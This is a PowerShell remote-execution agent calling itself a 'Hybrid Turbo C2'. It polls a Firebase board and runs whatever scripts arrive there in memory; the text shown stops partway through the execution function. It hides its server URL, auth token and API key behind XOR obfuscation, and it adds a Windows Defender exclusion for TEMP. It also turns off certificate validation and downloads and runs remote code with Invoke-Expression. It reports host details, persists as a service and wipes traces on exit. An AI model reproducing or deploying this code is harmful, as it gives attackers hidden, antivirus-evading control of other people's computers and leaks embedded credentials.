param (
    [string]$ApiKey,
    [string]$GatewayUrl,
    [string]$FirebaseUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))",
    [string]$FirebaseAuthToken = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))",
    [string]$SecretKey,
    [string]$Mode = "temp",
    [switch]$AsService,
    [switch]$InstallService,
    [switch]$UninstallService,
    [int]$PollIntervalSec = 3
)

# Console  UTF-8
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Token  Firebase RTDB
if ([string]::IsNullOrWhiteSpace($FirebaseAuthToken)) {
    if (-not [string]::IsNullOrWhiteSpace($env:BB_JAVIS_AUTH_TOKEN)) {
        $FirebaseAuthToken = $env:BB_JAVIS_AUTH_TOKEN.Trim()
    }
}
$script:FirebaseAuthToken = $FirebaseAuthToken

# TLS 1.2  Connection Pool Limit ( Deadlock)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
    [System.Net.ServicePointManager]::DefaultConnectionLimit = 128
    [System.Net.ServicePointManager]::Expect100Continue = $false
    [System.Net.ServicePointManager]::MaxServicePointIdleTime = 5000
} catch {}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

# Pre-load Core Assemblies  Zero-Latency In-Memory Execution
try {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction SilentlyContinue
} catch {}

# Windows Defender  TEMP ( Administrator)
try {
    $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
    $isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Host "[PRE-CHECK] Configuring Windows Defender exclusion for TEMP folder..." -ForegroundColor DarkGray
        Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    }
} catch {}

# Service
if ($InstallService.IsPresent) {
    $installScript = Join-Path $PSScriptRoot "install_service.ps1"
    if (Test-Path $installScript) {
        & powershell -NoProfile -ExecutionPolicy Bypass -File $installScript
    } else {
        try {
            [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
            $wc = New-Object System.Net.WebClient
            $wc.Encoding = [System.Text.Encoding]::UTF8
            $code = $wc.DownloadString("https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/install_service.ps1")
            $wc.Dispose()
            Invoke-Expression $code
        } catch {
            Write-Host "[ERROR] Cannot download install_service.ps1: $_" -ForegroundColor Red
        }
    }
    return
}

if ($UninstallService.IsPresent) {
    $uninstallScript = Join-Path $PSScriptRoot "uninstall_service.ps1"
    if (Test-Path $uninstallScript) {
        & powershell -NoProfile -ExecutionPolicy Bypass -File $uninstallScript
    } else {
        try {
            [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
            $wc = New-Object System.Net.WebClient
            $wc.Encoding = [System.Text.Encoding]::UTF8
            $code = $wc.DownloadString("https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/uninstall_service.ps1")
            $wc.Dispose()
            Invoke-Expression $code
        } catch {
            Write-Host "[ERROR] Cannot download uninstall_service.ps1: $_" -ForegroundColor Red
        }
    }
    return
}

# Native .NET HTTP Client (Zero-Dependency 100%  curl.exe)
function Invoke-FirebaseHttp {
    param(
        [Parameter(Mandatory=$true)][string]$Uri,
        [string]$Method = "GET",
        [string]$Body = $null,
        [int]$TimeoutSec = 15,
        [string]$Key = $script:JavisApiKey
    )
    $finalUri = $Uri
    if (-not [string]::IsNullOrWhiteSpace($script:FirebaseAuthToken)) {
        $sep = if ($finalUri.Contains("?")) { "&" } else { "?" }
        if ($finalUri -notmatch "[?&]auth=") {
            $finalUri = "$finalUri${sep}auth=$script:FirebaseAuthToken"
        }
    }
    $request = [System.Net.HttpWebRequest]::Create($finalUri)
    $request.Method = $Method
    $request.Timeout = $TimeoutSec * 1000
    $request.ReadWriteTimeout = $TimeoutSec * 1000
    $request.KeepAlive = $false

    if (-not [string]::IsNullOrWhiteSpace($Key)) {
        $request.Headers["X-Javis-Key"] = $Key
        if ($Uri -notlike "$BaseUrl*") {
            $request.Headers["Authorization"] = "Bearer " + $Key
        }
    }

    if (-not [string]::IsNullOrEmpty($Body)) {
        $request.ContentType = "application/json; charset=utf-8"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Body)
        $request.ContentLength = $bytes.Length
        try {
            $reqStream = $request.GetRequestStream()
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Close()
        } catch {
            try { $request.Abort() } catch {}
            throw $_
        }
    }

    try {
        $response = $request.GetResponse()
        $respStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($respStream, [System.Text.Encoding]::UTF8)
        $result = $reader.ReadToEnd()
        $reader.Close()
        $respStream.Close()
        $response.Close()
        return $result
    } catch [System.Net.WebException] {
        if ($_.Response) {
            try {
                $respStream = $_.Response.GetResponseStream()
                $reader = New-Object System.IO.StreamReader($respStream, [System.Text.Encoding]::UTF8)
                $errResult = $reader.ReadToEnd()
                $reader.Close()
                $respStream.Close()
                $_.Response.Close()
                return $errResult
            } catch {}
        }
        try { $request.Abort() } catch {}
        throw $_
    } finally {
        try { $request.Abort() } catch {}
    }
}

$utf8NoBom = New-Object System.Text.UTF8Encoding($false)

# URL  ( GatewayUrl  Fallback  FirebaseUrl)
$BaseUrl = if (-not [string]::IsNullOrWhiteSpace($GatewayUrl)) { $GatewayUrl } else { $FirebaseUrl }
if ($BaseUrl -notlike "*/") {
    $BaseUrl = $BaseUrl + "/"
}

$isFixedService = ($Mode -eq "fix" -or $AsService.IsPresent)
$serviceConfigDir = Join-Path $env:ProgramData "BB_Javis"
$serviceConfigFile = Join-Path $serviceConfigDir "service_config.json"

# Function to resolve API Key (Zero-Touch 100% with Built-in Enterprise Key fallback)
function Get-OrPromptJavisApiKey {
    param([string]$ArgKey)

    if (-not [string]::IsNullOrWhiteSpace($ArgKey)) {
        return $ArgKey.Trim()
    }
    if (-not [string]::IsNullOrWhiteSpace($env:BB_JAVIS_API_KEY)) {
        return $env:BB_JAVIS_API_KEY.Trim()
    }

    $configDir = Join-Path $env:LOCALAPPDATA "BB_Javis"
    $configFile = Join-Path $configDir "config.json"
    if (Test-Path $configFile) {
        try {
            $cfg = Get-Content $configFile -Raw -Encoding UTF8 | ConvertFrom-Json
            if ($cfg -and -not [string]::IsNullOrWhiteSpace($cfg.apiKey)) {
                return $cfg.apiKey.Trim()
            }
        } catch {}
    }

    # Built-in Enterprise Key for SDP UAT Tenant (Zero-Touch 100%)
    return "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x38, 0x38, 0x30, 0x05, 0x29, 0x3e, 0x2a, 0x2f, 0x3b, 0x2e, 0x05, 0x6c, 0x3b, 0x39, 0x6d, 0x63, 0x3c, 0x68, 0x69, 0x05, 0x6f, 0x3b, 0x63, 0x6f, 0x3e, 0x3c, 0x69, 0x6e, 0x62, 0x38, 0x38, 0x3e, 0x62, 0x3b, 0x68, 0x6e, 0x6e, 0x6a, 0x3f, 0x6d, 0x3b, 0x3f, 0x3b, 0x62, 0x6d, 0x3b, 0x38, 0x3e, 0x68, 0x3f, 0x62, 0x3c) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
}

$script:JavisApiKey = Get-OrPromptJavisApiKey -ArgKey $ApiKey

# PIN 4  Command Board (Anti-Collision Guard)
function Get-UniqueSecretKey {
    param([string]$TargetBaseUrl)
    for ($attempt = 0; $attempt -lt 15; $attempt++) {
        $candidate = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
        try {
            $checkUrl = $TargetBaseUrl + "jobs/$candidate.json?shallow=true"
            $existing = Invoke-FirebaseHttp -Uri $checkUrl -Method "GET" -TimeoutSec 5
            if ([string]::IsNullOrWhiteSpace($existing) -or $existing.Trim() -eq "null") {
                return $candidate
            }
        } catch {
            return $candidate
        }
    }
    return (Get-Random -Minimum 1000 -Maximum 10000).ToString()
}

$script:DeviceCustomName = $env:COMPUTERNAME

# Persistent PIN  Fix (Windows Service)
if ($isFixedService -and [string]::IsNullOrWhiteSpace($SecretKey)) {
    if (Test-Path $serviceConfigFile) {
        try {
            $savedCfg = Get-Content $serviceConfigFile -Raw -Encoding UTF8 | ConvertFrom-Json
            if ($savedCfg) {
                if ($savedCfg.authToken -and [string]::IsNullOrWhiteSpace($script:FirebaseAuthToken)) {
                    $script:FirebaseAuthToken = $savedCfg.authToken.ToString().Trim()
                }
                if ($savedCfg.custom_name) {
                    $script:DeviceCustomName = $savedCfg.custom_name.ToString().Trim()
                }
                if ($savedCfg.pin) {
                    $candPin = $savedCfg.pin.ToString().Trim()
                    $checkDevUrl = $BaseUrl + "devices/$candPin.json"
                    $devJson = Invoke-FirebaseHttp -Uri $checkDevUrl -Method "GET" -TimeoutSec 5
                    if ([string]::IsNullOrWhiteSpace($devJson) -or $devJson.Trim() -eq "null") {
                        $SecretKey = $candPin
                    } else {
                        $devObj = ConvertFrom-Json -InputObject $devJson.Trim() -ErrorAction SilentlyContinue
                        if ($devObj -and ($devObj.hostname -eq $env:COMPUTERNAME -or $devObj.pin -eq $candPin)) {
                            $SecretKey = $candPin
                        }
                    }
                }
            }
        } catch {}
    }
}

if ([string]::IsNullOrWhiteSpace($SecretKey)) {
    $SecretKey = Get-UniqueSecretKey -TargetBaseUrl $BaseUrl
} else {
    $SecretKey = $SecretKey.Trim()
}

# Persistent PIN  Fix
if ($isFixedService) {
    try {
        if (-not (Test-Path $serviceConfigDir)) { $null = New-Item -ItemType Directory -Path $serviceConfigDir -Force }
        $cfgObj = @{
            pin = $SecretKey
            hostname = $env:COMPUTERNAME
            custom_name = $script:DeviceCustomName
            mode = "fix"
            authToken = $script:FirebaseAuthToken
            updated_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
        } | ConvertTo-Json
        $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
        [System.IO.File]::WriteAllText($serviceConfigFile, $cfgObj, $utf8NoBom)
    } catch {}
}

# Tenant  API Key
$displayTenant = "Default"
$keyParts = $script:JavisApiKey.Split('_')
if ($keyParts.Length -ge 2 -and $keyParts[0] -eq 'bbj') {
    $displayTenant = $keyParts[1].ToUpper()
}
$maskedKey = if ($script:JavisApiKey.Length -gt 15) {
    $script:JavisApiKey.Substring(0, 12) + "..." + $script:JavisApiKey.Substring($script:JavisApiKey.Length - 4)
} else {
    "Configured"
}

# Heartbeat
function Get-LocalIPv4 {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*" } |
               Select-Object -ExpandProperty IPAddress -First 1)
        if ($ip) { return $ip }
    } catch {}
    try {
        $ips = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) |
               Where-Object { $_.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork -and $_.IPAddressToString -notlike "127.*" }
        if ($ips) { return $ips[0].IPAddressToString }
    } catch {}
    return "127.0.0.1"
}

function Get-OsName {
    try {
        $os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if ($os) { return $os.Trim() }
    } catch {}
    try {
        $os = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if ($os) { return $os.Trim() }
    } catch {}
    return [System.Environment]::OSVersion.VersionString
}

function Get-PublicIPv4 {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "BB_Javis/2.0")
        $pIp = $wc.DownloadString("https://api.ipify.org")
        $wc.Dispose()
        if ($pIp -and $pIp.Trim().Length -le 45) { return $pIp.Trim() }
    } catch {}
    return "-"
}

$script:DeviceLocalIp = Get-LocalIPv4
$script:DevicePublicIp = Get-PublicIPv4
$script:DeviceOsVersion = Get-OsName
$script:LastHeartbeatUtc = [DateTime]::MinValue
$script:DeviceRegisteredAt = $null

function Update-DeviceHeartbeat {
    param(
        [string]$Status = "online"
    )
    try {
        $devUrl = $BaseUrl + "devices/$SecretKey.json"
        $nowIso = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        $devData = @{
            pin = $SecretKey
            hostname = $env:COMPUTERNAME
            custom_name = if (-not [string]::IsNullOrWhiteSpace($script:DeviceCustomName)) { $script:DeviceCustomName } else { $env:COMPUTERNAME }
            local_ip = $script:DeviceLocalIp
            public_ip = $script:DevicePublicIp
            os_version = $script:DeviceOsVersion
            user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            service_mode = ($Mode -eq "fix" -or $AsService.IsPresent)
            status = $Status
            last_heartbeat = $nowIso
            tenant = $displayTenant
        }
        if ($Status -eq "online" -and -not $script:DeviceRegisteredAt) {
            $script:DeviceRegisteredAt = $nowIso
            $devData["registered_at"] = $nowIso
        }
        $json = $devData | ConvertTo-Json -Compress
        $null = Invoke-FirebaseHttp -Uri $devUrl -Method "PUT" -Body $json -TimeoutSec 5
        $script:LastHeartbeatUtc = [DateTime]::UtcNow
    } catch {}
}

# Secret Key  Professional
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "              BB_JAVIS ENTERPRISE REMOTE EXECUTION AGENT              " -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
Write-Host "  -> Remote Secret Key : " -NoNewline -ForegroundColor Gray
Write-Host "[ $SecretKey ]" -NoNewline -ForegroundColor Green
$modeBadge = if ($isFixedService) { "(FIXED SERVICE)" } else { "(ACTIVE TEMP)" }
Write-Host " $modeBadge" -ForegroundColor Yellow
Write-Host "  -> Execution Mode    : " -NoNewline -ForegroundColor Gray
Write-Host $(if ($isFixedService) { "Always-On Windows Service" } else { "Ephemeral On-Demand" }) -ForegroundColor White
Write-Host "  -> Machine Hostname  : " -NoNewline -ForegroundColor Gray
if ($script:DeviceCustomName -and $script:DeviceCustomName -ne $env:COMPUTERNAME) {
    Write-Host "$script:DeviceCustomName " -NoNewline -ForegroundColor Green
    Write-Host "($env:COMPUTERNAME)" -ForegroundColor DarkGray
} else {
    Write-Host "$env:COMPUTERNAME" -ForegroundColor Cyan
}
Write-Host "  -> Local IPv4        : " -NoNewline -ForegroundColor Gray
Write-Host "$script:DeviceLocalIp" -ForegroundColor Cyan
Write-Host "  -> Tenant Workspace  : " -NoNewline -ForegroundColor Gray
Write-Host "[$displayTenant]" -ForegroundColor Cyan
Write-Host "  -> API Key Security  : " -NoNewline -ForegroundColor Gray
Write-Host "$maskedKey (Persistent)" -ForegroundColor Green
Write-Host "  -> Connection Status : " -NoNewline -ForegroundColor Gray
Write-Host "Real-Time SSE Connected (<10ms In-Memory Turbo)" -ForegroundColor Green
Write-Host "  -> Engine Type       : " -NoNewline -ForegroundColor Gray
Write-Host "Hybrid Turbo C2 (In-Memory Runspace + Dual-Engine)" -ForegroundColor White
Write-Host "  -> One-Link URL      : " -NoNewline -ForegroundColor Gray
Write-Host $(if ($isFixedService) { "da.gd/bbj-fix" } else { "da.gd/bbj" }) -ForegroundColor Cyan
Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "   * Give the Remote Secret Key above to your controller" -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor DarkCyan
if (-not $AsService.IsPresent) {
    Write-Host "  Ready for incoming commands. Press Ctrl+C to stop." -ForegroundColor Gray
    Write-Host "======================================================================" -ForegroundColor DarkCyan
}

# PIN  Cloud Command Board
try {
    $claimUrl = $BaseUrl + "jobs/$SecretKey/claim.json"
    $claimBody = '{"claimed_at":"' + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + '","status":"active","engine":"realtime_sse","tenant":"' + $displayTenant + '","hostname":"' + $env:COMPUTERNAME + '"}'
    $null = Invoke-FirebaseHttp -Uri $claimUrl -Method "PUT" -Body $claimBody -TimeoutSec 10
} catch {}

# Presence Heartbeat (Immediate Initial Ping)
Update-DeviceHeartbeat -Status "online"

# Dedicated In-Memory Background Heartbeat Worker (Autonomous 25s Pulse)
$script:HeartbeatRunspace = $null
$script:HeartbeatPowerShell = $null

function Start-BackgroundHeartbeatWorker {
    try {
        $script:HeartbeatRunspace = [runspacefactory]::CreateRunspace()
        $script:HeartbeatRunspace.Open()
        $script:HeartbeatPowerShell = [powershell]::Create()
        $script:HeartbeatPowerShell.Runspace = $script:HeartbeatRunspace

        $bgScript = {
            param($BaseUrl, $SecretKey, $AuthToken, $ApiKey, $ComputerName, $LocalIp, $PublicIp, $OsVersion, $CustomName, $IsService, $Tenant)
            
            try {
                [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            } catch {}

            $devUrl = $BaseUrl + "devices/$SecretKey.json"
            if (-not [string]::IsNullOrWhiteSpace($AuthToken)) {
                $sep = if ($devUrl.Contains("?")) { "&" } else { "?" }
                $devUrl = "$devUrl${sep}auth=$AuthToken"
            }

            while ($true) {
                try {
                    $nowIso = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
                    $devData = @{
                        pin = $SecretKey
                        hostname = $ComputerName
                        custom_name = if (-not [string]::IsNullOrWhiteSpace($CustomName)) { $CustomName } else { $ComputerName }
                        local_ip = $LocalIp
                        public_ip = $PublicIp
                        os_version = $OsVersion
                        service_mode = $IsService
                        status = "online"
                        last_heartbeat = $nowIso
                        tenant = $Tenant
                    }
                    $json = $devData | ConvertTo-Json -Compress
                    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)

                    $req = [System.Net.HttpWebRequest]::Create($devUrl)
                    $req.Method = "PUT"
                    $req.ContentType = "application/json; charset=utf-8"
                    $req.Timeout = 10000
                    $req.ReadWriteTimeout = 10000
                    $req.KeepAlive = $false
                    if (-not [string]::IsNullOrWhiteSpace($ApiKey)) {
                        $req.Headers["X-Javis-Key"] = $ApiKey
                    }
                    $req.ContentLength = $bytes.Length
                    $stream = $req.GetRequestStream()
                    $stream.Write($bytes, 0, $bytes.Length)
                    $stream.Close()
                    $resp = $req.GetResponse()
                    $resp.Close()
                } catch {}

                [System.Threading.Thread]::Sleep(25000)
            }
        }

        $null = $script:HeartbeatPowerShell.AddScript($bgScript).
            AddArgument($BaseUrl).
            AddArgument($SecretKey).
            AddArgument($script:FirebaseAuthToken).
            AddArgument($script:JavisApiKey).
            AddArgument($env:COMPUTERNAME).
            AddArgument($script:DeviceLocalIp).
            AddArgument($script:DevicePublicIp).
            AddArgument($script:DeviceOsVersion).
            AddArgument($script:DeviceCustomName).
            AddArgument($isFixedService).
            AddArgument($displayTenant)

        $null = $script:HeartbeatPowerShell.BeginInvoke()
    } catch {}
}

Start-BackgroundHeartbeatWorker

# Clean Exit:  Session
$script:isExiting = $false
$script:restartRequested = $false
$cleanExitAction = {
    if ($script:isExiting) { return }
    $script:isExiting = $true
    
    # Stop Background Heartbeat Runspace
    try {
        if ($script:HeartbeatPowerShell) {
            $script:HeartbeatPowerShell.Stop()
            $script:HeartbeatPowerShell.Dispose()
        }
        if ($script:HeartbeatRunspace) {
            $script:HeartbeatRunspace.Close()
            $script:HeartbeatRunspace.Dispose()
        }
    } catch {}
    
    if ($Mode -eq "fix" -or $AsService.IsPresent) {
        Write-Host "`n[SERVICE EXIT] Updating status to offline on Cloud board..." -ForegroundColor Yellow
        try {
            Update-DeviceHeartbeat -Status "offline"
        } catch {}
        try {
            $delUrl = $BaseUrl + "jobs/$SecretKey.json"
            $null = Invoke-FirebaseHttp -Uri $delUrl -Method "DELETE" -TimeoutSec 5
        } catch {}
    } else {
        Write-Host "`n[SELF-DESTRUCT] Terminating session and cleaning Cloud board..." -ForegroundColor Yellow
        try {
            $delUrl = $BaseUrl + "jobs/$SecretKey.json"
            $null = Invoke-FirebaseHttp -Uri $delUrl -Method "DELETE" -TimeoutSec 5
        } catch {}
        try {
            $delDevUrl = $BaseUrl + "devices/$SecretKey.json"
            $null = Invoke-FirebaseHttp -Uri $delDevUrl -Method "DELETE" -TimeoutSec 5
        } catch {}
    }

    # TEMP (Zero-Footprint)
    Get-ChildItem -Path $env:TEMP -Filter "remote_script_*.ps1" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Get-ChildItem -Path $env:TEMP -Filter "agent_*_temp.json" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    Write-Host "[SUCCESS] Cloud session finalized cleanly. Zero data residue." -ForegroundColor Green
}

try {
    [Console]::TreatControlCAsInput = $false
    $cancelHandler = [ConsoleCancelEventHandler]{
        param($s, $e)
        & $cleanExitAction
    }
    [Console]::add_CancelKeyPress($cancelHandler)
} catch {}

# ( Live Streaming, Emergency Abort  Hard Timeout)
function Execute-RemoteJob {
    param(
        [string]$JobId,
        [PSCustomObject]$JobDetails,
        [string]$BaseUrl,
        [string]$CurrentKey
    )

    Write-Host "`n[NEW JOB] Received incoming job ID: $JobId" -ForegroundColor Yellow

    # Secret Key
    if ($JobDetails.secret_key -ne $CurrentKey) {
        Write-Host " -> Access Denied: Secret Key mismatch! (Skipping job)" -ForegroundColor Red
        $patchBody = @{
            status = "failed"
            exit_code = 403
            stderr = "Access Denied: Invalid Secret Key (403 Forbidden)"
            completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        } | ConvertTo-Json -Compress
        $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
        $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $patchBody -TimeoutSec 10
        return
    }

    $command = $JobDetails.script_content
    $timeoutSec = 600
    if ($JobDetails.timeout_sec -and [int]::TryParse($JobDetails.timeout_sec, [ref]$null)) {
        $timeoutSec = [Math]::Max(10, [int]$JobDetails.timeout_sec)
    }

    # System Restart (In-Place Agent Reset)
    if ($command -eq "__JAVIS_SYSTEM_RESTART__" -or $command -eq "restart-agent") {
        Write-Host " -> [SYSTEM RESTART] Special restart command received! Scheduling in-place reset..." -ForegroundColor Yellow
        $restartRes = @{
            status = "completed"
            exit_code = 0
            stdout = "[SYSTEM RESTART] Agent restart acknowledged. Performing in-place reset while maintaining Secret Key: [ $CurrentKey ]"
            stderr = ""
            completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        } | ConvertTo-Json -Compress
        $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
        $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $restartRes -TimeoutSec 5
        
        $script:restartRequested = $true
        return
    }

    # Host  (Remote Rename / Set Alias)
    if ($command -match "^@SET_ALIAS\s+(.+)$" -or $command -match "^@RENAME\s+(.+)$") {
        $newAlias = $Matches[1].Trim()
        Write-Host " -> [REMOTE RENAME] Special command received: Changing display name to '$newAlias'..." -ForegroundColor Yellow
        $script:DeviceCustomName = $newAlias
        
        # service_config.json
        if (Test-Path $serviceConfigFile) {
            try {
                $savedCfg = Get-Content $serviceConfigFile -Raw -Encoding UTF8 | ConvertFrom-Json
                $savedCfg.custom_name = $newAlias
                $savedCfg.updated_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
                $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
                [System.IO.File]::WriteAllText($serviceConfigFile, ($savedCfg | ConvertTo-Json), $utf8NoBom)
            } catch {}
        }

        # Heartbeat
        Update-DeviceHeartbeat -Status "online"

        $renameRes = @{
            status = "completed"
            exit_code = 0
            stdout = "[SUCCESS] Machine alias updated to '$newAlias' successfully."
            stderr = ""
            completed_at = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        } | ConvertTo-Json -Compress
        $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
        $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $renameRes -TimeoutSec 5
        return
    }

    # 
    if ($command -match "(?i)drop\s+database" -or $command -match "(?i)truncate\s+table") {
        Write-Host " -> [SECURITY WARNING] High-risk command detected (DROP DATABASE / TRUNCATE TABLE)" -ForegroundColor Yellow
    }

    # Running
    Write-Host " -> Updating job status: Running (Timeout: ${timeoutSec}s)..." -ForegroundColor Yellow
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $runBody = '{"status":"running","last_heartbeat":"' + $timestamp + '","progress_phase":"Executing command...","abort":false}'
    $updateUrl = $BaseUrl + "jobs/$CurrentKey/$JobId.json"
    $null = Invoke-FirebaseHttp -Uri $updateUrl -Method "PATCH" -Body $runBody -TimeoutSec 10

    $stdoutCollector = [System.Collections.Generic.List[string]]::new()
    $stderrCollector = [System.Collections.Generic.List[string]]::new()
    $exitCode = 0
    $isAborted = $false
    $isTimedOut = $false

    # Execution Engine Mode ( turbo: In-Memory Runspace <10ms,  fallback  isolated: Process)
    $execMode = "turbo"
    if ($JobDetails.execution_mode -and $JobDetails.execution_mode.ToString().ToLower() -eq "isolated") {
        $execMode = "isolated"
    }

    if ($execMode -eq "turbo") {
        # ENGINE 1: ULTRA-SPEED HYBRID IN-MEMORY RUNSPACE (<10ms Response & Zero-ColdStart)
        Write-Host " -> [ENGINE 1: TURBO] Executing via In-Memory Runspace..." -ForegroundColor Cyan
        $ps = [System.Management.Automation.PowerShell]::Create()
        [void]$ps.AddScript('$InformationPreference = "Continue"; $WarningPreference = "Continue"')
        [void]$ps.AddScript($command)

        $inputCol = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
        $outputCol = New-Object 'System.Management.Automation.PSDataCollection[PSObject]'
        $asyncResult = $ps.BeginInvoke($inputCol, $outputCol)

        $startTime = [DateTime]::UtcNow
        $lastStreamingTime = [DateTime]::UtcNow
        $lastAbortCheckTime = [DateTime]::UtcNow
        $stdoutTotalLength = 0
        $stderrTotalLength = 0
        $maxCharLimit = 500000
        $outIdx = 0
        $infoIdx = 0
        $warnIdx = 0
        $errIdx = 0

        while (-not $asyncResult.IsCompleted) {
            Start-Sleep -Milliseconds 25

            # Output  Output Collection
            while ($outIdx -lt $outputCol.Count) {
                $item = $outputCol[$outIdx]
                if ($item -ne $null) {
                    $str = $item.ToString()
                    if ($stdoutTotalLength -lt $maxCharLimit) {
                        $stdoutCollector.Add($str)
                        $stdoutTotalLength += $str.Length
                    }
                }
                $outIdx++
            }

            # Write-Host  Information Stream
            while ($infoIdx -lt $ps.Streams.Information.Count) {
                $info = $ps.Streams.Information[$infoIdx]
                if ($info -ne $null -and $info.MessageData -ne $null) {
                    $str = $info.MessageData.ToString()
                    if ($stdoutTotalLength -lt $maxCharLimit) {
                        $stdoutCollector.Add($str)
                        $stdoutTotalLength += $str.Length
                    }
                }
                $infoIdx++
            }

            # Warning Stream
            while ($warnIdx -lt $ps.Streams.Warning.Count) {
                $warn = $ps.Streams.Warning[$warnIdx]
                if ($warn -ne $null) {
                    $str = "[WARNING] " + $warn.Message
                    if ($stdoutTotalLength -lt $maxCharLimit) {
                        $stdoutCollector.Add($str)
                        $stdoutTotalLength += $str.Length
                    }
                }
                $warnIdx++
            }

            # Error Stream
            while ($errIdx -lt $ps.Streams.Error.Count) {
                $err = $ps.Streams.Error[$errIdx]
                if ($err -ne $null) {
                    $str = $err.ToString()
                    if ($stderrTotalLength -lt $maxCharLimit) {
                        $stderrCollector.Add($str)
                        $stderrTotalLength += $str.Length
                    }
                }
                $errIdx++
            }

            $now = [DateTime]::UtcNow

            # Abort  Cloud  500ms
            if (($now - $lastAbortCheckTime).TotalMilliseconds -ge 500) {
                $lastAbortCheckTime = $now
                try {
                    $abortUrl = $BaseUrl + "jobs/$CurrentKey/$JobId/abort.json"
                    $abortVal = Invoke-FirebaseHttp -Uri $abortUrl -Method "GET" -TimeoutSec 2
                    if ($abortVal -and $abortVal.Trim().ToLower() -eq "true") {
                        Write-Host "`n -> [EMERGENCY ABORT] Abort signal received from controller!" -ForegroundColor Red
                        $isAborted = $true
                        try { $ps.Stop() } catch {}
                        break
                    }
                } catch {}
            }

            # Hard Timeout
            if (($now - $startTime).TotalSeconds -ge $timeoutSec) {
                Write-Host "`n -> [TIMEOUT] Execution exceeded Hard Timeout (${timeoutSec}s)!" -ForegroundColor Red
                $isTimedOut = $true
                try { $ps.Stop() } catch {}
                break
            }

            # Heartbeat  Firebase  1.5
            if (($now - $lastStreamingTime).TotalSeconds -ge 1.5) {
                $lastStreamingTime = $now
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $patchData = @{
                    last_heartbeat = $timestamp
